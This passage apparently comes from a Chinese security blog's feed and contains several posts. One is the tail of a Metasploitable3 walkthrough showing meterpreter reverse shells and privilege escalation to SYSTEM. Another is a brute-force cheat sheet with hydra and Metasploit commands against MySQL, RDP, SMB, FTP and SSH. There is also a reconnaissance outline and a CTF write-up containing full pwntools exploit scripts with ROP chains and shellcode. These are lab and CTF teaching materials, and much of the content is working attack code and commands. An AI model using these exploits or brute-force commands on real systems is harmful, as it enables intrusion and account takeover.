exploit(multi/<span class="hljs-keyword">handler</span>) &gt; exploit -j -zmsf5 exploit(multi/<span class="hljs-keyword">handler</span>) &gt; sessions -i <span class="hljs-number">1</span>[*] Exploit running <span class="hljs-keyword">as</span> background job <span class="hljs-number">1.</span>[*] Exploit completed, but <span class="hljs-keyword">no</span> <span class="hljs-keyword">session</span> was created.[*] Started <span class="hljs-keyword">reverse</span> TCP <span class="hljs-keyword">handler</span> <span class="hljs-keyword">on</span> <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.70</span>:<span class="hljs-number">13789</span> msf5 exploit(multi/<span class="hljs-keyword">handler</span>) &gt; sessions -i <span class="hljs-number">1</span>[*] <span class="hljs-keyword">Starting</span> interaction <span class="hljs-keyword">with</span> <span class="hljs-number">1.</span>..meterpreter &gt; getwdC:\wamp\www\uploadsmeterpreter &gt; <span class="hljs-keyword">execute</span> -f <span class="hljs-string">"C:\\wamp\\www\\uploads\\13789.exe"</span>Process <span class="hljs-number">1372</span> created.meterpreter &gt; [*] Meterpreter <span class="hljs-keyword">session</span> <span class="hljs-number">3</span> opened (<span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.70</span>:<span class="hljs-number">13789</span> -&gt; <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.66</span>:<span class="hljs-number">50670</span>) <span class="hljs-keyword">at</span> <span class="hljs-number">2019</span><span class="hljs-number">-01</span><span class="hljs-number">-22</span> <span class="hljs-number">02</span>:<span class="hljs-number">38</span>:<span class="hljs-number">39</span> <span class="hljs-number">-0500</span></code></pre></p><p>我们用上传的第一个payload执行我们的第二次payload，就可以得到普通用户权限<br><pre><code class="hljs undefined">msf5 exploit(multi/handler) &gt; sessions Active sessions===============  Id  Name <span class="hljs-built_in"> Type </span>                    Information                                  <span class="hljs-built_in"> Connection</span>  --  ----  ----                     -----------                                   ----------  1         meterpreter php/windows  LOCAL<span class="hljs-built_in"> SERVICE </span>(0) @ METASPLOITABLE3           192.168.1.70:13579 -&gt; 192.168.1.66:53138 (192.168.1.66)  2         meterpreter x86/windows  NT AUTHORITY\LOCAL<span class="hljs-built_in"> SERVICE </span>@ METASPLOITABLE3  192.168.1.70:13789 -&gt; 192.168.1.66:54852 (192.168.1.66)</code></pre></p><p>接下来用ms18_8120提权</p><pre><code class="hljs undefined">msf5 exploit(multi/<span class="hljs-keyword">handler</span>) &gt; <span class="hljs-keyword">use</span> exploit/windows/<span class="hljs-keyword">local</span>/ms18_8120_win32k_privesc msf5 exploit(windows/<span class="hljs-keyword">local</span>/ms18_8120_win32k_privesc) &gt; <span class="hljs-keyword">set</span> <span class="hljs-keyword">session</span> <span class="hljs-number">3</span><span class="hljs-keyword">session</span> =&gt; <span class="hljs-number">3</span>msf5 exploit(windows/<span class="hljs-keyword">local</span>/ms18_8120_win32k_privesc) &gt; exploit [*] Started <span class="hljs-keyword">reverse</span> TCP <span class="hljs-keyword">handler</span> <span class="hljs-keyword">on</span> <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.70</span>:<span class="hljs-number">4444</span> [*] Sending stage (<span class="hljs-number">179779</span> <span class="hljs-keyword">bytes</span>) <span class="hljs-keyword">to</span> <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.66</span>[+] Exploit finished, <span class="hljs-keyword">wait</span> <span class="hljs-keyword">for</span> privileged payload execution <span class="hljs-keyword">to</span> complete.[*] Meterpreter <span class="hljs-keyword">session</span> <span class="hljs-number">4</span> opened (<span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.70</span>:<span class="hljs-number">4444</span> -&gt; <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.66</span>:<span class="hljs-number">50799</span>) <span class="hljs-keyword">at</span> <span class="hljs-number">2019</span><span class="hljs-number">-01</span><span class="hljs-number">-22</span> <span class="hljs-number">02</span>:<span class="hljs-number">42</span>:<span class="hljs-number">04</span> <span class="hljs-number">-0500</span>meterpreter &gt;</code></pre><p>查看sessions就可以看到普通用户权限变成了system权限<br><pre><code class="hljs undefined">msf5 exploit(windows/local/ms18_8120_win32k_privesc) &gt; sessionsActive sessions===============  Id  Name <span class="hljs-built_in"> Type </span>                    Information                                  <span class="hljs-built_in"> Connection</span>  --  ----  ----                     -----------                                   ----------  1         meterpreter php/windows  LOCAL<span class="hljs-built_in"> SERVICE </span>(0) @ METASPLOITABLE3           192.168.1.70:13579 -&gt; 192.168.1.66:53138 (192.168.1.66)  2         meterpreter x86/windows  NT AUTHORITY\LOCAL<span class="hljs-built_in"> SERVICE </span>@ METASPLOITABLE3  192.168.1.70:13789 -&gt; 192.168.1.66:54852 (192.168.1.66)  3         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ METASPLOITABLE3         192.168.1.70:4444 -&gt; 192.168.1.66:62289 (192.168.1.66)</code></pre></p><p>到此，复现完毕</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>涨姿势！暴力破解方法和工具</title>
    <link href="/2019/01/18/Violent-cracking/"/>
    <url>/2019/01/18/Violent-cracking/</url>
    
    <content type="html"><![CDATA[<p><strong>字典虽小，够用就行</strong><br><a id="more"></a></p><h3 id="二、-暴力破解"><a href="#二、-暴力破解" class="headerlink" title="二、 暴力破解"></a>二、 暴力破解</h3><h4 id="2-1-mysql数据库破解"><a href="#2-1-mysql数据库破解" class="headerlink" title="2.1 mysql数据库破解"></a>2.1 mysql数据库破解</h4><p>&emsp;&emsp;# 爆破数据库账号密码，数据库必须要开启3306远程登录<br>&emsp;&emsp;&emsp;&emsp;2.1.1 Hydra<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;hydra IP地址 -l 用户名 -P 字典 服务名 -V<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;# hydra 192.168.146.141 -l root -P dist.txt mysql -V<br>&emsp;&emsp;&emsp;&emsp;2.1.2 HexorBase<br>&emsp;&emsp;&emsp;&emsp;2.1.3 metasploit（search查找模块、back返回）<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;use auxiliary/scanner/mysql/mysql_login<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;# show options<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;set host IP地址<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;set username 用户<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;set PASS_FILE dist.txt<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;set port 端口号<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;run</p><h4 id="2-2-mysql数据库配置（对外）"><a href="#2-2-mysql数据库配置（对外）" class="headerlink" title="2.2 mysql数据库配置（对外）"></a>2.2 mysql数据库配置（对外）</h4><p>&emsp;&emsp;&emsp;&emsp;2.2.1 3306端口对外开放<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;grant all privileges on <em>.</em> to ‘root‘@’%’ identified by ‘123456’ with grant option;<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;flush privileges;（root，123456）<br>&emsp;&emsp;&emsp;&emsp;2.2.2 Navicat数据库管理软件<br>&emsp;&emsp;&emsp;&emsp;2.2.3 报错解决方案<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;is blocked because of many connec错误解决方案：<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;进入Mysql数据库查看max_connect_errors：<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;show variables like ‘max_connect_errors’;<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;修改max_connect_errors的数量为1000：<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;set global max_connect_errors = 1000;<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;查看是否修改成功：<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;show variables like ‘max_connect_errors’;</p><h4 id="2-3-3389远程连接爆破"><a href="#2-3-3389远程连接爆破" class="headerlink" title="2.3 3389远程连接爆破"></a>2.3 3389远程连接爆破</h4><p>&emsp;&emsp;&emsp;&emsp;2.3.1 DuBrute<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;这个只能爆rdp的，smb的用下面（比如win server）<br>&emsp;&emsp;&emsp;&emsp;2.3.2 Hydra<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;hydra IP地址 -l 单个账户名 -P 字典路径 服务名 -V<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;# hydra 192.168.146.141 -l administrator -P /top1500.txt rdp -V  (rdp可以换smb)<br>&emsp;&emsp;&emsp;&emsp;2.3.3 acccheck（smb）<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;acccheck -t 192.168.0.106 -U user.txt -P password.txt<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;acccheck -t 192.168.0.106 -u tian -P dic.txt<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;结果保存在cracked文件中</p><h4 id="2-4-Web-Tomcat中间件"><a href="#2-4-Web-Tomcat中间件" class="headerlink" title="2.4 Web-Tomcat中间件"></a>2.4 Web-Tomcat中间件</h4><p>&emsp;&emsp;&emsp;&emsp;2.4.1 Metasploit<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;use auxiliary/scanner/http/tomcat_mgr_login<br>&emsp;&emsp;&emsp;&emsp;2.4.3 对外访问<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;Server.xml<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&lt;Engine name=”Catalina” defaultHost=”IP地址”><br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&lt;Host name=”IP地址” appBase=”webapps” npackWARs=”true” autoDeploy=”true”></p><h4 id="2-5-ftp爆破"><a href="#2-5-ftp爆破" class="headerlink" title="2.5 ftp爆破"></a>2.5 ftp爆破</h4><p>&emsp;&emsp;&emsp;&emsp;2.5.1 Metasploit<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;use auxiliary/scanner/ftp/ftp_login<br>&emsp;&emsp;&emsp;&emsp;2.5.2 Hydra<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;hydra IP地址 -l 单个账户名 -P 字典路径 服务名 -V<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;# hydra 192.168.146.141 -l admin -P /top1500.txt ftp -V</p><h4 id="2-6-ssh爆破"><a href="#2-6-ssh爆破" class="headerlink" title="2.6 ssh爆破"></a>2.6 ssh爆破</h4><p>&emsp;&emsp;&emsp;&emsp;2.6.1 Metasploit<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;use auxiliary/scanner/ssh/ssh_login<br>&emsp;&emsp;&emsp;&emsp;2.6.2 Hydra<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;hydra IP地址 -l 单个账户名 -P 字典路径 服务名 -V<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;#hydra 192.168.146.141 -l root -P /top1500.txt ssh -V</p><h4 id="2-7-Webshell爆破"><a href="#2-7-Webshell爆破" class="headerlink" title="2.7 Webshell爆破"></a>2.7 Webshell爆破</h4><p>&emsp;&emsp;&emsp;&emsp;2.7.1 BurpSuite</p>]]></content>
    
    
    
    <tags>
      
      <tag>暴力破解</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Web渗透测试中一些信息收集的方法和思路</title>
    <link href="/2019/01/17/information-collection/"/>
    <url>/2019/01/17/information-collection/</url>
    
    <content type="html"><![CDATA[<p><strong>对敌人不了解，怎么打败敌人</strong><br><a id="more"></a></p><h3 id="一、-信息收集："><a href="#一、-信息收集：" class="headerlink" title="一、 信息收集："></a>一、 信息收集：</h3><h4 id="1-1-真实IP地址"><a href="#1-1-真实IP地址" class="headerlink" title="1.1 真实IP地址"></a>1.1 真实IP地址</h4><p>&emsp;&emsp;<strong>如果IP地址不是真实的，测试会出现偏差(如：测试的端口服务全部都是假的)</strong><br>&emsp;&emsp;1.1.1 ping命令<br>&emsp;&emsp;1.1.2 IP138在线查询<br>&emsp;&emsp;1.1.3 CDN地址探测（隐藏真实IP地址）<br>&emsp;&emsp;&emsp;&emsp;如：xxx.cdn.XXX….IP地址（这个是CDN地址不是真实IP）<br>&emsp;&emsp;&emsp;&emsp;绕过CDN小窍门：XSS漏洞、DDOS、邮件订阅…等</p><h4 id="1-2-端口服务探测"><a href="#1-2-端口服务探测" class="headerlink" title="1.2 端口服务探测"></a>1.2 端口服务探测</h4><p>&emsp;&emsp;<strong>用于暴力破解、系统架构判断</strong><br>&emsp;&emsp;1个域名可以解析多个IP地址的端口<br>&emsp;&emsp;1.2.1 Nmap探测<br>&emsp;&emsp;1.2.2 Zenmap探测</p><h4 id="1-3-HTML前端敏感注释信息"><a href="#1-3-HTML前端敏感注释信息" class="headerlink" title="1.3 HTML前端敏感注释信息"></a>1.3 HTML前端敏感注释信息</h4><p>&emsp;&emsp;1.3.1 &lt;!–看注释信息,<strong>因为有的管理员会把测试账户密码写进去</strong>–&gt;<br>&emsp;&emsp;1.3.2 前端框架信息，如：Jquery框架<br>&emsp;&emsp;1.3.3 框架查看攻略<br>&emsp;&emsp;&emsp;&emsp;1.3.3.1 路径地址（扔百度里）<br>&emsp;&emsp;&emsp;&emsp;1.3.3.2 JS里面版权信息<br>&emsp;&emsp;1.3.4 框架信息扔百度里搜索公开漏洞<br>&emsp;&emsp;&emsp;&emsp;1.3.4.1 DOM XSS跨站脚本攻击漏洞<br>&emsp;&emsp;&emsp;&emsp;1.3.4.2 ….（其他未知漏洞）</p><h4 id="1-4-whois信息收集"><a href="#1-4-whois信息收集" class="headerlink" title="1.4 whois信息收集"></a>1.4 whois信息收集</h4><p>&emsp;&emsp;1.4.1 在线收集，如：DNS地址/注册邮箱/时间…等<br>&emsp;&emsp;&emsp;&emsp;1.4.1.1 拿到邮箱地址可以百度查询公开的密码等信息<br>&emsp;&emsp;1.4.2 Kali-whois查询</p><h4 id="1-5-中间件版本信息"><a href="#1-5-中间件版本信息" class="headerlink" title="1.5 中间件版本信息"></a>1.5 中间件版本信息</h4><p>&emsp;&emsp;1.5.1 系统报错的方式<br>&emsp;&emsp;1.5.2 抓包的方式（如：请求：OPTIONS）<br>&emsp;&emsp;&emsp;&emsp;1.5.2.1 如果OPTIONS以后开启了PUT方法，可以尝试上传漏洞GETSHELL<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;IIS6.0、Apache存在这个漏洞可能性较大<br>&emsp;&emsp;1.5.3 漏洞扫描器自带判断功能<br>&emsp;&emsp;1.5.4 端口服务探测方式自动探测</p><h4 id="1-6-系统功能信息"><a href="#1-6-系统功能信息" class="headerlink" title="1.6 系统功能信息"></a>1.6 系统功能信息</h4><p>&emsp;&emsp;<strong>只要能交互的，全部都收集（包括功能地址）</strong><br>&emsp;&emsp;1.6.1 增删改查功能<br>&emsp;&emsp;1.6.2 文件上传功能<br>&emsp;&emsp;1.6.3 功能请求方式和参数</p><h4 id="1-7-系统服务端编程语言"><a href="#1-7-系统服务端编程语言" class="headerlink" title="1.7 系统服务端编程语言"></a>1.7 系统服务端编程语言</h4><p>&emsp;&emsp;1.7.1 编程语言（JavaWeb、PHP…等）<br>&emsp;&emsp;&emsp;&emsp;  JSP（特征：HTML前端开头以及部分代码模块后面大量的换行）<br>&emsp;&emsp;1.7.2 编程框架（如：S2、THinkPHP…等以及相关目录和URL后缀）<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;如：.action、.do</p><h4 id="1-8-域名-子域名"><a href="#1-8-域名-子域名" class="headerlink" title="1.8 域名/子域名"></a>1.8 域名/子域名</h4><p>&emsp;&emsp;<strong>二级、三级、四级、五级…,通过域名来判断该系统的数量规模</strong><br>&emsp;&emsp;1.8.1 子域名挖掘机<br>&emsp;&emsp;1.8.2 其他工具（….）</p><h4 id="1-9-目录-子目录"><a href="#1-9-目录-子目录" class="headerlink" title="1.9 目录/子目录"></a>1.9 目录/子目录</h4><p>&emsp;&emsp;<strong>二级、三级、四级、五级…</strong><br>&emsp;&emsp;1.9.1 御剑目录扫描器<br>&emsp;&emsp;1.9.2 Kali-Dirb目录探测<br>&emsp;&emsp;1.9.3 Kali-Dirbuster（/usr/share/dirbuster下）<br>&emsp;&emsp;1.9.4 BurpSuite爬虫</p><h4 id="1-10-C段-旁注"><a href="#1-10-C段-旁注" class="headerlink" title="1.10 C段/旁注"></a>1.10 C段/旁注</h4><p>&emsp;&emsp;1.10.1 旁站在线查询<br>&emsp;&emsp;1.10.2 C段在线查询</p><h4 id="1-11-DNS地址信息收集"><a href="#1-11-DNS地址信息收集" class="headerlink" title="1.11 DNS地址信息收集"></a>1.11 DNS地址信息收集</h4><p>&emsp;&emsp;SOA 权威记录<br>&emsp;&emsp;NS 服务器记录<br>&emsp;&emsp;A IPv4地址记录<br>&emsp;&emsp;MX 邮件交换记录<br>&emsp;&emsp;PTR IP地址反解析<br>&emsp;&emsp;AAAA IPv6地址记录<br>&emsp;&emsp;CNAME 别名记录<br>&emsp;&emsp;1.11.1 Kali-Dig<br>&emsp;&emsp;1.11.2 Kali-dnsenum</p><h4 id="1-12-综合信息收集"><a href="#1-12-综合信息收集" class="headerlink" title="1.12 综合信息收集"></a>1.12 综合信息收集</h4><p>&emsp;&emsp;1.12.1 Kali-theharvester(比如：-d baidu.com -l 100 -b bing)</p><h4 id="1-13-资产信息收集"><a href="#1-13-资产信息收集" class="headerlink" title="1.13 资产信息收集"></a>1.13 资产信息收集</h4><p>&emsp;&emsp;1.13.1 钟馗之眼（在线）<br>&emsp;&emsp;1.13.2 佛法查询（在线）</p><h4 id="1-14-搜索引擎黑客"><a href="#1-14-搜索引擎黑客" class="headerlink" title="1.14 搜索引擎黑客"></a>1.14 搜索引擎黑客</h4><p>&emsp;&emsp;1.14.1 百度黑客搜索语法<br>&emsp;&emsp;1.14.2 谷歌黑客搜索语法</p><h4 id="1-15-邮箱信息"><a href="#1-15-邮箱信息" class="headerlink" title="1.15 邮箱信息"></a>1.15 邮箱信息</h4><p>&emsp;&emsp;1.15.1 公开的邮箱地址<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;如：@XX.com<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;你可以看到命名规则，还能收集更多的信息<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;留着邮箱地址后期可以暴力破解<br>&emsp;&emsp;1.15.2 邮箱地址泄露的密码<br>&emsp;&emsp;1.15.3 邮箱地址泄露的其他信息</p><h4 id="1-16-系统公开漏洞"><a href="#1-16-系统公开漏洞" class="headerlink" title="1.16 系统公开漏洞"></a>1.16 系统公开漏洞</h4><p>&emsp;&emsp;1.16.1 乌云镜像<br>&emsp;&emsp;1.16.2 老漏洞复现<br>&emsp;&emsp;1.16.3 老漏洞暴露的其他信息</p><h4 id="1-17-WAF防火墙探测"><a href="#1-17-WAF防火墙探测" class="headerlink" title="1.17 WAF防火墙探测"></a>1.17 WAF防火墙探测</h4><p>&emsp;&emsp;1.17.1 报错方式<br>&emsp;&emsp;1.17.2 漏洞探测（如：敏感字符：% – “ ‘ @ //等）<br>&emsp;&emsp;1.17.3 公开漏洞<br>&emsp;&emsp;1.17.4 扫描探测（如：Nmap）</p><h4 id="1-18-其他信息收集"><a href="#1-18-其他信息收集" class="headerlink" title="1.18 其他信息收集"></a>1.18 其他信息收集</h4><p>&emsp;&emsp;1.18.1 火狐插件-Wappalyzer<br>&emsp;&emsp;1.18.2 其他插件….<br>&emsp;&emsp;1.18.3 APP手机软件破解或抓包<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;破解以后里面有注释信息和其他信息<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;抓包可以看到通讯IP地址，进行二次，三次信息收集和渗透</p>]]></content>
    
    
    
    <tags>
      
      <tag>信息收集</tag>
      
      <tag>Web</tag>
      
      <tag>渗透测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PCB鹏城杯CTFwriteup&amp;复现</title>
    <link href="/2018/12/03/PCBCTFwp/"/>
    <url>/2018/12/03/PCBCTFwp/</url>
    
    <content type="html"><![CDATA[<p><strong>大大大佬的博客-&gt;<a href="https://delcoding.github.io/2018/12/pcb-writeup/" target="_blank" rel="noopener">传送门</a></strong></p><a id="more"></a><h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><h4 id="0x00-overInt"><a href="#0x00-overInt" class="headerlink" title="0x00 overInt"></a>0x00 overInt</h4><p>思路：有两个key的检测，过了之后有一个循环以下内容<br><pre><code class="hljs undefined">*(&amp;<span class="hljs-built_in">v8</span> + <span class="hljs-built_in">v6</span>) = <span class="hljs-built_in">v5</span><span class="hljs-comment">;</span><span class="hljs-symbol">v3</span> = (int *)(unsigned int)<span class="hljs-built_in">v5</span><span class="hljs-comment">;</span><span class="hljs-symbol">printf</span>(<span class="hljs-string">"str_pos is %c\n"</span>, <span class="hljs-built_in">v3</span>)<span class="hljs-comment">;</span></code></pre></p><p>这里直接将输入的值写到一个地址的偏移，就有一个任意地址写的洞，然后通过这个进行常规的rop<br>exp如下<br><pre><code class="hljs undefined">from pwn import *from struct import packcontext(os=<span class="hljs-string">'linux'</span>,arch=<span class="hljs-string">'amd64'</span>,aslr = <span class="hljs-string">'False'</span>)<span class="hljs-keyword">local</span> = <span class="hljs-number">0</span>log_level=<span class="hljs-string">'debug'</span><span class="hljs-keyword">if</span> <span class="hljs-keyword">local</span>:p = process(<span class="hljs-string">"./overInt"</span>)<span class="hljs-meta">#,env=&#123;<span class="hljs-string">'LD_PRELOAD'</span>:<span class="hljs-string">'./libc_x64.so.6'</span>&#125;)</span>elf = ELF(<span class="hljs-string">"./overInt"</span>)<span class="hljs-meta">#libc = ELF(<span class="hljs-string">'./libc_x64.so.6'</span>)</span><span class="hljs-keyword">else</span>:p = remote(<span class="hljs-string">'58.20.46.148'</span>,<span class="hljs-number">35272</span>)elf = ELF(<span class="hljs-string">"./overInt"</span>)<span class="hljs-meta">#libc = ELF(<span class="hljs-string">'./libc_x64.so.6'</span>)</span>def change_addr(num,<span class="hljs-built_in">string</span>):j = <span class="hljs-number">0</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">8</span>):p.recvuntil(<span class="hljs-string">"Which position you want to modify?\n"</span>)payload = p32(num)p.<span class="hljs-built_in">send</span>(payload)p.recvuntil(<span class="hljs-string">"What content you want to write in?\n"</span>)payload = <span class="hljs-built_in">string</span>[j]p.<span class="hljs-built_in">send</span>(payload)num += <span class="hljs-number">1</span>j += <span class="hljs-number">1</span>pop_rdi = <span class="hljs-number">0x0000000000400b13</span>read_got = elf.got[<span class="hljs-string">"read"</span>] <span class="hljs-meta"># 0x602038</span>alarm_got = elf.got[<span class="hljs-string">"alarm"</span>] <span class="hljs-meta"># 0x602030</span>start = <span class="hljs-number">0x4005D0</span>puts_plt = elf.plt[<span class="hljs-string">"puts"</span>] <span class="hljs-meta"># 0x40054c</span><span class="hljs-meta">#gdb.attach(p,<span class="hljs-string">"b *0x400AAC"</span>)</span>p.recvuntil(<span class="hljs-string">"Please set arrary number:"</span>)p.<span class="hljs-built_in">send</span>(<span class="hljs-string">"over"</span>)p.recvuntil(<span class="hljs-string">"How many numbers do you have?\n"</span>)p.<span class="hljs-built_in">send</span>(p32(<span class="hljs-number">10</span>))<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">9</span>):data = p.recv()p.<span class="hljs-built_in">send</span>(p32(<span class="hljs-number">0</span>))p.recv() p.<span class="hljs-built_in">send</span>(p32(<span class="hljs-number">0x20633372</span>))p.recvuntil(<span class="hljs-string">"How many positions you want to modify?\n"</span>)p.<span class="hljs-built_in">send</span>(p32(<span class="hljs-number">32</span>))<span class="hljs-built_in">string</span> = <span class="hljs-string">"\x13\x0b\x40\x00\x00\x00\x00\x00"</span> <span class="hljs-meta">#pop_rdi</span>change_addr(<span class="hljs-number">0x38</span>,<span class="hljs-built_in">string</span>)<span class="hljs-built_in">string</span> = <span class="hljs-string">"\x38\x20\x60\x00\x00\x00\x00\x00"</span> <span class="hljs-meta">#read_got</span>change_addr(<span class="hljs-number">0x40</span>,<span class="hljs-built_in">string</span>)<span class="hljs-built_in">string</span> = <span class="hljs-string">"\x4c\x05\x40\x00\x00\x00\x00\x00"</span> <span class="hljs-meta">#puts_plt</span>change_addr(<span class="hljs-number">0x48</span>,<span class="hljs-built_in">string</span>)<span class="hljs-built_in">string</span> = <span class="hljs-string">"\xd0\x05\x40\x00\x00\x00\x00\x00"</span> <span class="hljs-meta">#start</span>change_addr(<span class="hljs-number">0x50</span>,<span class="hljs-built_in">string</span>)p.recvuntil(<span class="hljs-string">"!"</span>)data = p.recvuntil(<span class="hljs-string">"\n"</span>,drop=<span class="hljs-literal">True</span>)data = data.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">"\x00"</span>)data = u64(data)libc_base = data - <span class="hljs-number">0x0f7250</span>print <span class="hljs-string">"base : "</span>+<span class="hljs-built_in">hex</span>(libc_base)binsh_addr = libc_base + <span class="hljs-number">0x18cd57</span>system_addr = libc_base + <span class="hljs-number">0x045390</span>print <span class="hljs-string">"system_addr :"</span> +<span class="hljs-built_in">hex</span>(system_addr)print <span class="hljs-string">"binsh_addr :"</span> +<span class="hljs-built_in">hex</span>(binsh_addr)<span class="hljs-meta">#gdb.attach(p,<span class="hljs-string">"b *0x400AAC"</span>)</span>p.recvuntil(<span class="hljs-string">"Please set arrary number:"</span>)p.<span class="hljs-built_in">send</span>(<span class="hljs-string">"over"</span>)p.recvuntil(<span class="hljs-string">"How many numbers do you have?\n"</span>)p.<span class="hljs-built_in">send</span>(p32(<span class="hljs-number">10</span>))<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">9</span>):data = p.recv()p.<span class="hljs-built_in">send</span>(p32(<span class="hljs-number">0</span>))p.recv() p.<span class="hljs-built_in">send</span>(p32(<span class="hljs-number">0x20633372</span>))p.recvuntil(<span class="hljs-string">"How many positions you want to modify?\n"</span>)p.<span class="hljs-built_in">send</span>(p32(<span class="hljs-number">24</span>))<span class="hljs-built_in">string</span> = <span class="hljs-string">"\x13\x0b\x40\x00\x00\x00\x00\x00"</span> <span class="hljs-meta">#pop_rdi</span>change_addr(<span class="hljs-number">0x38</span>,<span class="hljs-built_in">string</span>)<span class="hljs-built_in">string</span> = pack(<span class="hljs-string">'L'</span>,binsh_addr)change_addr(<span class="hljs-number">0x40</span>,<span class="hljs-built_in">string</span>)<span class="hljs-built_in">string</span> = pack(<span class="hljs-string">'L'</span>,system_addr)change_addr(<span class="hljs-number">0x48</span>,<span class="hljs-built_in">string</span>)p.interactive()</code></pre></p><h4 id="0x01-treasure"><a href="#0x01-treasure" class="headerlink" title="0x01 treasure"></a>0x01 treasure</h4><p>这个题目是赛后队友才做出来的，有点可惜。思路是劫持程序流。提前布局，R15和R14寄存器是没有用到的，每次输入只能输入9个字符长度，所以不能直接写shellcode，第一次写入控制那个9个长度的变量，使程序不跳到9，长度就可变。<br>exp如下：<br><pre><code class="hljs undefined"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> packcontext(<span class="hljs-built_in">os</span>=<span class="hljs-string">'linux'</span>,arch=<span class="hljs-string">'amd64'</span>,aslr = <span class="hljs-string">'False'</span>)<span class="hljs-keyword">local</span> = <span class="hljs-number">1</span>log_level=<span class="hljs-string">'debug'</span><span class="hljs-keyword">if</span> <span class="hljs-name">local</span>:p = process(<span class="hljs-string">"./treasure"</span>)#,env=&#123;<span class="hljs-string">'LD_PRELOAD'</span>:<span class="hljs-string">'./libc_x64.so.6'</span>&#125;)elf = ELF(<span class="hljs-string">"./treasure"</span>)#libc = ELF(<span class="hljs-string">'./libc_x64.so.6'</span>)<span class="hljs-name">else</span>:p = remote(<span class="hljs-string">'58.20.46.148'</span>,<span class="hljs-number">35272</span>)elf = ELF(<span class="hljs-string">"./overInt"</span>)#libc = ELF(<span class="hljs-string">'./libc_x64.so.6'</span>)def mycode(shellcode):p.recvuntil(<span class="hljs-string">"(enter 'n' to quit) :"</span>)p.sendline(<span class="hljs-string">"\x90"</span>)p.recvuntil(<span class="hljs-string">"start!!!!"</span>)p.send(shellcode)test = <span class="hljs-string">"abcdefghi"</span>#gdb.attach(p,<span class="hljs-string">"b *0x4009BA"</span> ) #b *<span class="hljs-number">0x400AAE</span><span class="hljs-string">")trea_addr = 0x4009BAshellcode = asm("</span>mov r15,rdx;<span class="hljs-string">"+"</span>nop;<span class="hljs-string">"*6)mycode(shellcode)shellcode = asm("</span>mov ebx,<span class="hljs-number">0x400A6c</span>;mov r14,rbx;<span class="hljs-string">"+"</span>nop;<span class="hljs-string">"*1)mycode(shellcode)shellcode = asm("</span>mov ebx,<span class="hljs-number">30</span>;<span class="hljs-string">"+"</span>nop;<span class="hljs-string">"*4)mycode(shellcode)shellcode = asm("</span>mov rax,r15;mov rsi,rbx;jmp r14;<span class="hljs-string">")mycode(shellcode)shellcode = "</span>\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05<span class="hljs-string">"p.sendline(shellcode)"</span><span class="hljs-string">""</span>p.recvuntil(<span class="hljs-string">"(enter 'n' to quit) :"</span>)p.sendline(<span 